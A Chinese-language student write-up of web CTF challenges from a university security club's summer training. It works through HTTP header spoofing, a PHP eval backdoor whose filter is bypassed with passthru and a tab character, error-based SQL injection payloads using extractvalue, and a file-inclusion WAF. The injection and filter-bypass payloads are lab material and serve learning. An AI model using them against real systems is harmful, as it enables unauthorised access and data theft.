# HnuSec 2024暑期培训WP

> 学号：20233001306 
>
> 姓名：张博翔 
>
> ID:bx33661

[TOC]

---

## What Do You Want!

> 题目提示：babyhttp     是一道关于HTTP应用的题

![image-20240816094108949](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816094108949.png)

进来之后的页面,F12和抓包没有发现什么，于是使用`dirsearch`扫描了一下

![image-20240816121318849](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816121318849.png)

发现`/robots.txt`我们访问发现`The_Deep_Ends/`

我们访问发现：==提示：该页面只能在服务器本地访问==

我们修改IP伪造头，发现`X-Client-IP`可以伪造

我们访问发现：==希望从blog.hnusec.com点进来的==说明需要修改`Referer`信息，我们修改之后，

提示==需要黑神话官网的代理==  考点应该是 VIA

我在网上找了一会儿官网

`https://www.heishenhua.com/`-------------直面天命

![image-20240816122116596](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816122116596.png)

之后又提示需要修改浏览器访问，修改UA头后我们得到新页面的地址

**The_Golden_Light**

访问之后发现需要cookie传参数，`What-do-you-want`==`flag`---->我直接使用了浏览器直接改了，得到flag

```
HnuCTF{Baby_http_ab52833e-35f3-4ede-ab8f-2b70ad5c2598}
```

----

## 海大后台管理系统

> 题目描述：
>
> Ewoji是海北大学的一名学生，受命为学校打造一个世界上最安全的后台管理系统，可学校不知道Ewoji的真实水平，导致这个系统存在着很多安全隐患，你能狠狠拿下这个系统，然后看着Ewoji的学分被扣光光吗？

`CTRL+u`查看html文件之后,拿到了账号和密码

```
<!-- 声明：此登录系统由Ewoji，Emoji，Ekoji，Ecoji共同开发，现为测试阶段，系统管理员默认账号密码为Ewmkcoji/admin123aA，系统开发完毕时，请务必删除这条注释！！！！！！！！！！！！！-->>
```

试了一推指令，根据提示我们继续`CRTL+u`

```
<!-- 即使我还是把密码放这又怎样，反正我加密了嘻嘻cGFzc3dkOnhpeGl4aXhpX3dlbGNvbWVfdG9fdGhlX2ZpbmFsX2NoYWxsYW5nZQ==   -->>
//http://www.hiencode.com/base64.html,我使用的这个网站解码：
//解码结果如下：passwd:xixixixi_welcome_to_the_final_challange
```

我们将解码的密码输入这个命令行中后

得到:

```
终端是你的谎言，我才懒得写，留个后门不更方便吗？后门地址/Ewoji/final.php
```

访问这个地址：得到最后的题目

```php
<?php
//我是何晨光，我不想在战场上敌人捡到我的后门就可以直接使用，所以我决定加点限制
highlight_file(__FILE__);
error_reporting(0);
if(isset($_POST['num1']) && isset($_POST['num2'])){

    $num1 = $_POST['num1'];
    $num2 = $_POST['num2'];

    if( $num1!=$num2 && md5($num1) === md5($num2)){
        echo "继续吧";

        if(isset($_GET['cmd'])){
            $cmd = $_GET['cmd'];
            if(!preg_match("/flag|system|php|cat|\*|\_|tac|less|more|\.| |\'/i", $cmd)){
                eval($cmd);
            }

        }
    }else{
        echo "nonono";
    }
}
?>
```

1. 首先是`md5`绕过，**这里我使用的工具是HackBar** ，我采用数组的形式绕过第一层if

2. 发现禁用了一些命令执行、单引号、空格，我这里采用`passthru("ls%09/")`
3. 发现flaaaaag文件，采用`uniq`读取文件，发现了如下内容，需要提取数据，这里我手工提取

```
	secret:fl
	secret:ag{
    secret:sal
    secret:lasj
    secret:lsd
    secret:13-
    secret:m
    secret:cc
    secret:ab
    secret:ob
    secret:2
    secret:4
    secret:zz
    secret:mk
    secret:bx
    secret:2-
    secret:zx
    secret:ds
    secret:goh
    secret:dsx
    secret:zxc
    secret:zxw
    secret:0-
    secret:ddx
    secret:zxw
    secret:12s
    secret:dsx
    secret:asx
	secret:z
	secret:zk
	secret:f-
	secret:aw
	secret:xf
	secret:axd
	secret:amd
	secret:p2-
	secret:xx
	secret:z
	secret:mo
	secret:yh
	secret:aa
	secret:t
	secret:23
	secret:qw-
	secret:asd
	secret:gh
	secret:zxc
	secret:22
	secret:czxc
	secret:owm
	secret:231
	secret:bye!}
	
flag{sallasjlsd13-mccabob24zzmkbx2-zxdsgohdsxzxczxw0-ddxzxw12sdsxasxzzkf-awxfaxdamdp2-xxzmoyhaat23qw-asdghzxc22czxcowm231bye!}
```

这个flag手搓了很久，不容易呀！！！

----



## ez_serialize

> 没有什么题目提示，直接进入靶场

1. 进入页面，寻找了一会儿，发现是`cookie`中的`role` 值，这里我们修改为`admin`

![image-20240816153200193](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816153200193.png)

2. 给了一个页面提示：  /hhhheelllloooo.php
3. 我们访问此页面 ，得到具体题目：

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class WOWO{
    private $nano;
    public $hahaha;
    public $evn;

    public function __destruct()
    {
        $this->evn->do='do you know serialize?';
    }

    public function __get($a){
        echo $this->hahaha;
    }
}

class Soga{
    public $asdj;
    public $grape;

    public function __invoke()
    {
        return $this->asdj->nano;
    }
    public  function __toString()
    {
        $this->grape='123';
        return 'are you sure?';
    }
}


class H{
    public $a ;
    public $b ;

    public function __toString()
    {
        $Love=$this->a;
        $Love('',$this->b);
        return "it's too esay,yet?";
    }
}

class NANI{
    public $lal;
    public $so;

    public function __set($star,$bob){
        $str=$this->lal;
        $str();

    }
}

class Dman{
    public $apple;
    public $strawberry;

    public function __invoke(){
        return $this->apple;
    }

    public function __get($a){
        $des=$this->strawberry;
        $des();
    }

}

class Hnu{
    public $sun='HnuSec is very good';
    public $setad='do you think so?';

    public function __destruct(){
        if($this->setad='yes'){
            echo 'Thank you,have a fun.';
        }
    }
}

if(isset($_POST['Hnu'])){
    $cmd=$_POST['Hnu'];
    unserialize(base64_decode($cmd));
}

?>
```

感觉是在H类中为突破口，尝试修改值为`system`但是没有什么用，这道反序化的题没做出来

## 谢谢皮蛋

> 题目提示：让我皮蛋看看Flag都藏哪了
>
> //因为我也喜欢玩无畏契约所以说这个题比较亲切

进入页面只有一个输入框，按照习惯我输入数字1

![image-20240816154013030](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816154013030.png)

判断感觉是SQL注入题，回显在下面，我们抓包看一下

![image-20240816154325488](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816154325488.png)



判断变量名是`id`并且数据好像还被Base64编码了，本来想用sqlmap的但是，数据编码怎么使用我还不知道.......

测试了几个数据，发现可以用到刚学习的报错注入，我这里使用一下其他人的笔记辅助我做题

> mysql手工注入及报错注入笔记https://www.nonevector.top/posts/20.html
>
> Author:NoneVector

```
//摘抄于其他作者文章
查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))
爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="TABLE_NAME"))))
爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
```

我们按部就班的来做
updatexml(1,concat(0x7e,(select database())),0x7e))
1. `extractvalue(1,concat(0x7e,database()))`

   **回显：XPATH syntax error: '~ctf'**    得到数据库名称

2. `extractvalue(1,concat(0x7e，(select(group_concat(table_name))from(information_schema.tables)where(table_schema= "ctf"))))`

​	**回显：发现出现了问题，可能是屏蔽了一些字符，我们跟上面语句比较**

试了半天发现应该是`=`被屏蔽了，我上网查一下替换方案：

![image-20240816160738054](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816160738054.png)

可以使用`like`替换，我测试一下结果如何

`extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema like "ctf"))))`

​	**回显：XPATH syntax error: '~F149,hexo'**

3. `extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name like "F149"))))`

​	**回显:XPATH syntax error: '~id,des,value'**

4. 发现有三个表，逐一查询，发现在value中有flag

   `extractvalue(1,concat(0x7e,(select(group_concat(value))from(F149))))`

   **回显：XPATH syntax error: '~HnuCTF{50063e22-d15f-4edf-a8...'**

   ![image-20240816161525323](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816161525323.png)

   无法显示完整，我记得好像报错有字符限制，这里蒙了一会儿，在网上查到一些信息

   发现可以使用`left`和`right`左右查看

   `extractvalue(1,concat(0x7e,(select(right(group_concat(value),30))from(F149))))`

   **回显：XPATH syntax error: '~f-4edf-a835-c7462e69d63e}'**

5. 拼接得到flag：

```
HnuCTF{50063e22-d15f-4edf-a835-c7462e69d63e}
```



## 它真Plus了吗？如plus。。。。。

> 题目提示：它真Plus了吗？如plus。。。。。
>
> 还让我下载了一个密码字典，我首先感觉是要爆破

打开界面跟之前的那个题差不多

![image-20240816142817210](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816142817210.png)

但是这次`CRTL+u`只得到了账号，根据题目的提示我大概知道，好像需要爆破得到密码，

![image-20240816153718612](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816153718612.png)

![image-20240816142017150](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240816142017150.png)

在bp爆破，根据字节数发现这个密码，于是我使用它登录，进入后台，根据以前的题的思路，我`CRTL+u`发现base64编码的密码，解码得到：

```
解码结果如下：passwd:xixixixi_welcome_to_the_final_challange
```

我们按照以往思路，继续输入密码

 得到新网址----`/Ewoji`，我们接着访问

```php
<?php
highlight_file(__FILE__);
function waf(){
    if(preg_match("/<|\?|php|>|echo|filter|system|file|%|&|=|`|eval/i",$_GET['data'])){
        die("dangerous function detect!");
    };
}
if(isset($_GET['phpinfo'])){
    phpinfo();
}
waf();
include $_GET['data'];
?>
```

是`include`函数，考的应该是文件包含问题，并且这道题目还给我们看`phpinfo()`

过滤了/<、/？、/>

```
HnuCTF{6231447b-4c12-46c5-b37e-af0f52cb6981}
```

